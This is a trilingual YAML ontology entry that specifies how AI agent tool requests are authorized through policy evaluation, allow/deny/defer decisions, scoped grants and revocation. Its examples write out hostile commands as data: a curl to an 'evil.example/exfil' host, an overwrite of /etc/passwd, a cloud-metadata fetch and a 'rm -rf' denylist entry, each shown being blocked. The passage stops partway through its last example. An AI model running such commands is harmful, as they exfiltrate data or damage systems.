schema: moonweave.ai/ontology-node/v1
id: safety-permission-policy
kind: module
labels:
  zh: 授权与策略决策
  en: Authorization and policy decisions
  ja: 認可とポリシー判断
semantics:
  short_definition:
    zh: 授权与策略决策描述主体请求对资源执行动作时，如何依据版本化策略求值得到允许、拒绝或暂缓，并形成有范围、可撤销的授权。
    en: Authorization and policy decisions describes how a principal's request to act on a resource is evaluated against versioned policy to produce allow, deny, or defer, and how a scoped, revocable grant may follow.
    ja: 認可とポリシー判断は、主体が資源へ操作を求めたとき、版管理ポリシーで allow/deny/defer を求め、範囲付きで取消可能な認可を形成する過程を記述します。
  definition:
    zh: 本模块拥有授权闭环的可审计发生事实：版本化 PolicySpecification 及其规则、不可变 AuthorizationRequest、PolicyEvaluation 活动、AllowDecision/DenyDecision/DeferDecision、受 PermissionScope 约束的 AuthorizationGrant，以及与同一请求绑定的人工批准证据和 ToolApprovalGate 执行门。它映射 MCP 2025-06-18 Authorization 规范中的 OAuth 2.1 授权码/PKCE 流、protected-resource metadata、resource indicator 与 scope 绑定；Cursor allowlist 的 command allow/deny 列表与 sandbox 模式；Claude Code 的 Bash/edit/MCP/WebFetch 权限模式（default/acceptEdits/bypassPermissions 等）；以及 OpenAI Agents SDK Guardrails 的 input/output/tool tripwire 与 human-in-the-loop 中断。权限提示与人工批准是取证与执行环节，不能替代 AuthorizationRequest、PolicyDecision 或 AuthorizationGrant 本身。XACML 3.0 与 NIST SP 800-162 ABAC 提供规则、条件、效果与 subject-object-operation-environment 属性的权威表达模型，但不是额外业务节点。
    en: "This module owns auditable authorization-loop occurrences: versioned PolicySpecification and rules, immutable AuthorizationRequest, PolicyEvaluation activity, AllowDecision/DenyDecision/DeferDecision, AuthorizationGrant bounded by PermissionScope, human-approval evidence bound to the same request, and ToolApprovalGate enforcement. It maps MCP 2025-06-18 Authorization OAuth 2.1 authorization-code/PKCE flows, protected-resource metadata, resource indicators, and scope binding; Cursor allowlist command allow/deny lists and sandbox modes; Claude Code Bash/edit/MCP/WebFetch permission modes (default, acceptEdits, bypassPermissions, etc.); and OpenAI Agents SDK Guardrails input/output/tool tripwires with human-in-the-loop interruption. Permission prompts and human approvals are evidence and enforcement steps, not substitutes for AuthorizationRequest, PolicyDecision, or AuthorizationGrant. XACML 3.0 and NIST SP 800-162 ABAC supply authoritative models for rules, conditions, effects, and subject-object-operation-environment attributes but are not additional business nodes."
    ja: 本モジュールは auditable authorization loop occurrence—versioned PolicySpecification/rule、immutable AuthorizationRequest、PolicyEvaluation、Allow/Deny/DeferDecision、PermissionScope 限定 AuthorizationGrant、同一 request 绑定 human approval、ToolApprovalGate 執行—to 所有します。MCP 2025-06-18 Authorization の OAuth 2.1 code/PKCE flow、protected-resource metadata、resource indicator、scope binding、Cursor allowlist command allow/deny、sandbox mode、Claude Code Bash/edit/MCP/WebFetch permission mode、OpenAI Agents SDK Guardrails input/output/tool tripwire と HITL を写像します。permission prompt/human approval は evidence/enforcement であり AuthorizationRequest/PolicyDecision/AuthorizationGrant の代替ではありません。XACML 3.0 と NIST SP 800-162 ABAC は rule/condition/effect と subject-object-operation-environment attribute の権威 model を提供しますが追加 business node ではありません。
  why_needed:
    zh: 没有可追溯的授权链，团队无法解释“谁、在什么环境下、可以对什么做什么、依据哪版规则、有效到何时”，也无法发现旧决定被错误复用于新请求，或 defer 被当成隐式允许。
    en: Without a traceable authorization chain, teams cannot explain who may do what to which resource under which policy revision until when, detect stale decisions reused for new requests, or spot defer treated as implicit allow.
    ja: 追跡可能な認可連鎖がなければ、誰がどの環境で何に何をでき、どの policy revision まで有効かを説明できず、旧 decision の誤再利用や defer の implicit allow も検出できません。
  includes:
    - zh: 版本化 PolicySpecification、PolicyRule、PolicyCondition、PolicyCombiningAlgorithm，以及 Permit/Deny 效果与义务/建议。
      en: Versioned PolicySpecification, PolicyRule, PolicyCondition, PolicyCombiningAlgorithm, plus Permit/Deny effects and obligations or advice.
      ja: 版管理 PolicySpecification、PolicyRule、PolicyCondition、PolicyCombiningAlgorithm と Permit/Deny 効果、義務/助言。
    - zh: AuthorizationRequest、PolicyEvaluation、PolicyDecision（allow/deny/defer）、AuthorizationGrant、AuthorizationRevocation、PermissionScope 与 HumanApproval 证据。
      en: AuthorizationRequest, PolicyEvaluation, PolicyDecision (allow/deny/defer), AuthorizationGrant, AuthorizationRevocation, PermissionScope, and HumanApproval evidence.
      ja: AuthorizationRequest、PolicyEvaluation、PolicyDecision（allow/deny/defer）、AuthorizationGrant、AuthorizationRevocation、PermissionScope、HumanApproval 証拠。
    - zh: 与同一请求绑定的 PermissionPrompt、ToolApprovalGate，以及 MCP OAuth scope 与 Cursor/Claude 权限模式的可映射授权输入。
      en: PermissionPrompt and ToolApprovalGate bound to the same request, plus mappable authorization inputs from MCP OAuth scopes and Cursor/Claude permission modes.
      ja: 同一 request に結び付く PermissionPrompt、ToolApprovalGate、MCP OAuth scope と Cursor/Claude permission mode の写像可能な認可入力。
  excludes:
    - zh: Actor 身份、角色与能力声明归 runtime-actors；工具定义中的权限需求只是 AuthorizationRequest 的输入。
      en: Actor identity, roles, and capability declarations belong to runtime-actors; permission requirements in a tool definition are inputs to AuthorizationRequest only.
      ja: Actor 同一性、role、能力宣言は runtime-actors；tool definition の permission requirement は AuthorizationRequest 入力のみ。
    - zh: DataZone、TrustBoundary、BoundaryCrossing 归 safety-trust-boundary；策略把它们作为求值上下文而不复制其身份。
      en: DataZone, TrustBoundary, and BoundaryCrossing belong to safety-trust-boundary; policy uses them as evaluation context without copying their identity.
      ja: DataZone、TrustBoundary、BoundaryCrossing は safety-trust-boundary；policy は評価 context として使い同一性を複製しません。
    - zh: CommitGate、SideEffect、EffectReceipt 归 safety-commit-redaction；获准执行不等于已经执行或已经改变外部状态。
      en: CommitGate, SideEffect, and EffectReceipt belong to safety-commit-redaction; authorization to execute is not proof of execution or external change.
      ja: CommitGate、SideEffect、EffectReceipt は safety-commit-redaction；実行許可は実行済み/外部変更済みの証明ではありません。
  semantic_kind: null
  aliases: []
engineering:
  explanation:
    zh: 集成时应分别映射 MCP Authorization 的 OAuth 2.1 流（authorization server metadata、protected resource、scope、token introspection）、Cursor settings 的 allowlist/denylist 与 sandbox 模式、Claude Code `--permission-mode` 与 `.claude/settings.json` 工具权限、OpenAI Agents SDK 的 input/output/tool guardrails 与 `needs_approval` HITL。MCP scope 与 resource indicator 是 AuthorizationRequest 输入；OAuth token 或 allowlist 匹配结果是 PolicyEvaluation 证据；AllowDecision 可签发 AuthorizationGrant；Guardrails tripwire 产生 DeferDecision 或 DenyDecision，但不替代 CommitGate 的副作用裁决。
    en: "Integrations should map MCP Authorization OAuth 2.1 flows (authorization-server metadata, protected resource, scope, token introspection), Cursor settings allowlist/denylist and sandbox modes, Claude Code --permission-mode and .claude/settings.json tool permissions, and OpenAI Agents SDK input/output/tool guardrails with needs_approval HITL separately. MCP scopes and resource indicators are AuthorizationRequest inputs; OAuth token or allowlist match results are PolicyEvaluation evidence; AllowDecision may issue AuthorizationGrant; guardrail tripwires produce DeferDecision or DenyDecision but do not replace CommitGate side-effect adjudication."
    ja: 統合では MCP Authorization OAuth 2.1 flow、Cursor allowlist/denylist/sandbox、Claude Code permission mode/settings、OpenAI Agents SDK guardrails/HITL を個別写像します。MCP scope/resource indicator は AuthorizationRequest 入力、OAuth token/allowlist match は PolicyEvaluation 証拠、AllowDecision は AuthorizationGrant を発行、guardrail tripwire は Defer/DenyDecision を生成しますが CommitGate 副作用裁定の代替ではありません。
  typical_input:
    - description: MCP OAuth 2.1 authorization request with resource indicator and scopes.
      format: |
        GET /authorize?
          response_type=code
          &client_id=mcp-client-1
          &redirect_uri=http://127.0.0.1/callback
          &scope=tools:read tools:call
          &resource=https://mcp.example.com
          &code_challenge=...&code_challenge_method=S256
      source_claims: [claim-safety-permission-mcp-oauth]
    - description: Cursor allowlist blocking a disallowed shell command.
      format: |
        // .cursor/settings or sandbox policy
        {"command_allowlist": ["npm test", "git status"],
         "command_denylist": ["curl *", "rm -rf *"],
         "sandbox_mode": "workspace-write"}
        // agent requests: curl https://evil.example/exfil
        => PolicyDecision: deny (command not in allowlist)
      source_claims: [claim-safety-permission-cursor-allowlist]
    - description: Claude Code permission prompt for Bash write outside workspace.
      format: |
        permission_mode: default
        requested_action: Bash
        command: "echo secret > /etc/passwd"
        => PermissionPrompt prompt-61 awaiting human approval
        => PolicyDecision: defer until HumanApproval recorded
      source_claims: [claim-safety-permission-claude-code]
    - description: OpenAI Agents SDK tool guardrail tripwire before execution.
      format: |
        from agents import Agent, GuardrailFunctionOutput
        # tool guardrail returns tripwire_triggered=True
        => DeferDecision or DenyDecision with guardrail evidence
        => needs_approval pauses run until human approves
      source_claims: [claim-safety-permission-openai-guardrails]
  typical_output:
    - description: Traceable allow decision with determining rules and scoped grant.
      format: |
        {
          "request_id": "request-42",
          "policy_version_ref": "tool-authorization@7",
          "decision_id": "decision-42",
          "decision_kind": "allow",
          "determining_rule_refs": ["allow-approved-read@7"],
          "combining_algorithm_ref": "deny-overrides@1",
          "grant_id": "grant-42",
          "scope_ref": "scope-search-read",
          "valid_until": "2026-07-16T01:25:00.000Z"
        }
      source_claims: [claim-safety-permission-design]
    - description: Revoked grant terminates future validity without deleting history.
      format: |
        revocation_id: revocation-42
        revoked_at: 2026-07-16T01:23:00.000Z
        grant_id: grant-42
        effective_at_query_01:24: false
      source_claims: [claim-safety-permission-design]
  reference_implementations:
    - name: MCP Authorization Specification (2025-06-18)
      url: https://spec.modelcontextprotocol.io/specification/2025-06-18/basic/authorization/
      description: OAuth 2.1 authorization code/PKCE, protected-resource metadata, scopes, resource indicators.
    - name: Cursor Terminal Sandbox and Allowlist
      url: https://cursor.com/docs/agent/terminal
      description: sandbox.json egress, command allowlist/denylist, workspace-write isolation.
    - name: Claude Code Permissions
      url: https://docs.anthropic.com/en/docs/claude-code/permissions
      description: Bash, edit, MCP, WebFetch permission modes and settings.json tool rules.
    - name: OpenAI Agents SDK Guardrails
      url: https://openai.github.io/openai-agents-python/guardrails/
      description: Input, output, and tool guardrails with tripwires and human-in-the-loop.
    - name: OASIS XACML 3.0 Core
      url: https://docs.oasis-open.org/xacml/3.0/xacml-3.0-core-spec-cos01-en.html
      description: Policy, rule, target, condition, permit/deny effects, combining algorithms.
structure:
  identity_keys: [request_id, policy_version_ref]
  fields:
    - id: request_id
      labels: {zh: 授权请求标识, en: Authorization request identifier, ja: 認可要求識別子}
      definitions:
        zh: 一次不可变 AuthorizationRequest 的唯一 ID；主体、资源、动作、参数摘要或上下文变化必须产生新 request_id。
        en: Unique ID of one immutable AuthorizationRequest; any change to principal, resource, action, argument digest, or context must yield a new request_id.
        ja: 一回の immutable AuthorizationRequest の一意 ID。主体・資源・操作・引数 digest・context 変更時は新 request_id が必要です。
      datatype: string
      required: true
      cardinality: {min: 1, max: 1}
      pattern: '^request-[A-Za-z0-9._-]+$'
      example_value: request-42
      allowed_values: []
      source_claims: [claim-safety-permission-design]
    - id: policy_version_ref
      labels: {zh: 策略版本引用, en: Policy version reference, ja: ポリシー版参照}
      definitions:
        zh: PolicyEvaluation 实际使用的 PolicySpecification 版本；决定 replay 时必须可精确引用。
        en: Exact PolicySpecification revision used by PolicyEvaluation; must be precisely referenceable for replay.
        ja: PolicyEvaluation が実際に使用した PolicySpecification revision。replay 時に正確参照可能である必要があります。
      datatype: reference
      required: true
      cardinality: {min: 1, max: 1}
      pattern: null
      example_value: tool-authorization@7
      allowed_values: []
      source_claims: [claim-safety-permission-xacml]
    - id: decision_kind
      labels: {zh: 决定种类, en: Decision kind, ja: 判断種別}
      definitions:
        zh: allow、deny 或 defer 三值之一；缺失 combining algorithm 证据时决定不可审计。
        en: One of allow, deny, or defer; a decision is not auditable without combining-algorithm evidence.
        ja: allow、deny、defer のいずれか。combining algorithm 証拠がなければ判断は監査不可です。
      datatype: string
      required: true
      cardinality: {min: 1, max: 1}
      pattern: null
      example_value: allow
      allowed_values: [allow, deny, defer]
      source_claims: [claim-safety-permission-xacml]
    - id: scope_ref
      labels: {zh: 权限范围引用, en: Permission scope reference, ja: 権限範囲参照}
      definitions:
        zh: AuthorizationGrant 所绑定的 PermissionScope；与 DataZone 结构区域不同，可授予与撤销。
        en: PermissionScope bound to an AuthorizationGrant; distinct from structural DataZone, grantable and revocable.
        ja: AuthorizationGrant に結び付く PermissionScope。構造的 DataZone とは異なり付与・取消可能です。
      datatype: reference
      required: false
      cardinality: {min: 0, max: 1}
      pattern: null
      example_value: scope-search-read
      allowed_values: []
      source_claims: [claim-safety-permission-design]
  constraints:
    - id: permission-no-stale-decision-reuse
      severity: error
      expression_language: plain
      expression: An AllowDecision for request-A must not authorize request-B merely because the tool or action name matches; principal, resource, argument digest, and context must all match.
      explanation:
        zh: 动作名称不是授权对象的完整身份；复用旧决定会破坏 decides 关系的请求同一性。
        en: Action name is not complete authorization identity; reusing a stale decision violates request identity in decides relations.
        ja: 操作名は認可対象の完全同一性ではなく、旧 decision 再利用は decides の request 同一性を壊します。
      source_claims: [claim-safety-permission-design]
    - id: permission-grant-revocation-terminates
      severity: error
      expression_language: plain
      expression: An AuthorizationRevocation effective before query time must terminate grant validity even when expires_at is still in the future.
      explanation:
        zh: 主动撤销使未来有效性提前终止，但不删除历史 grant 与 revocation 身份。
        en: Active revocation ends future validity early without deleting historical grant and revocation identity.
        ja: 能動取消は将来有効性を早期終了し、歴史 grant/revocation 同一性は削除しません。
      source_claims: [claim-safety-permission-design]
    - id: permission-rule-conflict-requires-algorithm
      severity: error
      expression_language: plain
      expression: When applicable rules yield conflicting permit and deny results, PolicyDecision must cite the PolicyCombiningAlgorithm revision and determining rules; array order alone is insufficient.
      explanation:
        zh: 规则共现不说明冲突策略，必须有显式组合算法关系。
        en: Rule co-occurrence does not state conflict strategy; an explicit combining algorithm is required.
        ja: 規則共起は競合方式を示さず、明示 combining algorithm が必要です。
      source_claims: [claim-safety-permission-xacml]
  required_relations:
    - id: evaluation-consumes-request
      direction: outgoing
      predicate: consumes
      target_concept_id: AuthorizationRequest
      cardinality: {min: 1, max: 1}
      explanations:
        zh: PolicyEvaluation 必须消费恰好一个不可变 AuthorizationRequest。
        en: PolicyEvaluation must consume exactly one immutable AuthorizationRequest.
        ja: PolicyEvaluation は exactly 一つの immutable AuthorizationRequest を消費します。
      source_claims: [claim-safety-permission-design]
    - id: evaluation-produces-decision
      direction: outgoing
      predicate: produces
      target_concept_id: PolicyDecision
      cardinality: {min: 1, max: 1}
      explanations:
        zh: 每次 PolicyEvaluation 产生一个 PolicyDecision，并回指决定性规则与算法版本。
        en: Each PolicyEvaluation produces one PolicyDecision citing determining rules and algorithm revision.
        ja: 各 PolicyEvaluation は determining rule と algorithm revision を引用する PolicyDecision を一つ生成します。
      source_claims: [claim-safety-permission-design]
examples:
  - id: safety-permission-policy-example-mcp-oauth-scope
    labels:
      zh: MCP OAuth scope 与 resource indicator 授权
      en: MCP OAuth scope and resource indicator authorization
      ja: MCP OAuth scope と resource indicator 認可
    descriptions:
      zh: MCP 客户端请求 scope=tools:read tools:call 与 resource=https://mcp.example.com；PolicyEvaluation evaluation-42 使用 tool-authorization@7 验证 token introspection 与 scope 覆盖，产生 allow decision-42 并签发 grant-42（scope-mcp-read-call，有效期 15 分钟）。
      en: An MCP client requests scope=tools:read tools:call with resource=https://mcp.example.com. PolicyEvaluation evaluation-42 uses tool-authorization@7, validates token introspection and scope coverage, produces allow decision-42, and issues grant-42 (scope-mcp-read-call, 15-minute validity).
      ja: MCP client が scope=tools:read tools:call と resource=https://mcp.example.com を要求。PolicyEvaluation evaluation-42 が tool-authorization@7 で token introspection/scope coverage を検証し allow decision-42 を生成、grant-42（scope-mcp-read-call、15 分有効）を発行します。
    example_source:
      product: MCP
      url: https://spec.modelcontextprotocol.io/specification/2025-06-18/basic/authorization/
      version: OAuth 2.1 authorization and scopes
    field_values:
      request_id: request-42
      policy_version_ref: tool-authorization@7
      resource_indicator: https://mcp.example.com
      scopes: [tools:read, tools:call]
      decision_kind: allow
      grant_id: grant-42
    related_node_ids:
      - AuthorizationRequest
      - PolicyEvaluation
      - PolicyDecision
      - AuthorizationGrant
    related_relation_ids:
      - PolicyEvaluation-consumes-AuthorizationRequest
      - PolicyEvaluation-produces-PolicyDecision
    source_claims:
      - claim-safety-permission-mcp-oauth
  - id: safety-permission-policy-example-cursor-allowlist-deny
    labels:
      zh: Cursor allowlist 拒绝未列命令
      en: Cursor allowlist denies unlisted command
      ja: Cursor allowlist が未登録 command を拒否
    descriptions:
      zh: Agent 请求 Bash `curl https://metadata.internal/latest`；Cursor sandbox 配置仅允许 npm test 与 git status。PolicyEvaluation 匹配 deny-unlisted-shell@3，decision-55 为 deny，ToolApprovalGate 阻断执行且不创建 ToolAttempt。
      en: The agent requests Bash `curl https://metadata.internal/latest` while Cursor sandbox allows only npm test and git status. PolicyEvaluation matches deny-unlisted-shell@3; decision-55 is deny and ToolApprovalGate blocks execution without creating a ToolAttempt.
      ja: Agent が Bash `curl https://metadata.internal/latest` を要求。Cursor sandbox は npm test/git status のみ許可。PolicyEvaluation が deny-unlisted-shell@3 に一致し decision-55 deny、ToolApprovalGate が execution を block し ToolAttempt を作りません。
    example_source:
      product: Cursor
      url: https://cursor.com/docs/agent/terminal
      version: command allowlist and sandbox
    field_values:
      action: Bash
      command: curl https://metadata.internal/latest
      decision_kind: deny
      determining_rule: deny-unlisted-shell@3
      tool_attempt_created: false
    related_node_ids:
      - PolicyDecision
      - ToolApprovalGate
    related_relation_ids: []
    source_claims:
      - claim-safety-permission-cursor-allowlist
  - id: safety-permission-policy-example-claude-code-defer
    labels:
      zh: Claude Code 人工批准 defer 决定
      en: Claude Code human approval defer decision
      ja: Claude Code 人間承認 defer 判断
    descriptions:
      zh: Claude Code 在 default 模式下请求 edit 写入 `.env`；PolicyEvaluation 产生 defer decision-61，PermissionPrompt prompt-61 等待人工确认。HumanApproval approval-61 记录后重新 PolicyEvaluation 产生 allow decision-62 并签发短时 grant-61。
      en: Claude Code in default mode requests an edit writing to `.env`; PolicyEvaluation emits defer decision-61 and PermissionPrompt prompt-61 awaits confirmation. After HumanApproval approval-61 is recorded, a fresh PolicyEvaluation produces allow decision-62 and issues short-lived grant-61.
      ja: Claude Code default mode で `.env` への edit を要求。PolicyEvaluation が defer decision-61、PermissionPrompt prompt-61 が確認待ち。HumanApproval approval-61 記録後、新 PolicyEvaluation が allow decision-62 と短期 grant-61 を発行します。
    example_source:
      product: Anthropic
      url: https://docs.anthropic.com/en/docs/claude-code/permissions
      version: default permission mode and prompts
    field_values:
      permission_mode: default
      action: edit
      target: .env
      initial_decision: defer
      final_decision: allow
      human_approval_id: approval-61
    related_node_ids:
      - PermissionPrompt
      - HumanApproval
      - PolicyDecision
      - AuthorizationGrant
    related_relation_ids: []
    source_claims:
      - claim-safety-permission-claude-code
  - id: safety-permission-policy-example-openai-guardrail-tripwire
    labels:
      zh: OpenAI Agents SDK guardrail tripwire
      en: OpenAI Agents SDK guardrail tripwire
      ja: OpenAI Agents SDK guardrail tripwire
    descriptions:
      zh: Tool guardrail 在 delete_database 调用前检测到 tripwire_triggered=true；PolicyEvaluation 产生 deny decision-77，needs_approval 流程未启动因为 tripwire 直接阻断。决定引用 guardrail rule payment-destructive@2 而非仅 tool 名称。
      en: A tool guardrail detects tripwire_triggered=true before delete_database executes; PolicyEvaluation produces deny decision-77 and needs_approval does not start because the tripwire blocks directly. The decision cites guardrail rule payment-destructive@2, not the tool name alone.
      ja: delete_database 実行前に tool guardrail が tripwire_triggered=true を検出。PolicyEvaluation が deny decision-77 を生成し tripwire が直接 block するため needs_approval は開始されません。判断は tool 名だけでなく guardrail rule payment-destructive@2 を引用します。
    example_source:
      product: OpenAI
      url: https://openai.github.io/openai-agents-python/guardrails/
      version: tool guardrails and tripwires
    field_values:
      tool_name: delete_database
      tripwire_triggered: true
      decision_kind: deny
      guardrail_rule: payment-destructive@2
    related_node_ids:
      - PolicyDecision
      - ToolApprovalGate
    related_relation_ids: []
    source_claims:
      - claim-safety-permission-openai-guardrails
  - id: safety-permission-policy-example-stale-decision-reject
    labels:
      zh: 拒绝复用旧 allow 决定
      en: Reject reuse of stale allow decision
      ja: 旧 allow decision 再利用を拒否
    descriptions:
      zh: request-43 与 request-42 工具名相同但 argument digest 与 target scope 不同；系统拒绝把 decision-42 复用于 request-43，ToolApprovalGate gate-43 要求新 PolicyEvaluation。
      en: request-43 shares the tool name with request-42 but has a different argument digest and target scope; the system rejects reusing decision-42 for request-43 and ToolApprovalGate gate-43 requires a fresh PolicyEvaluation.
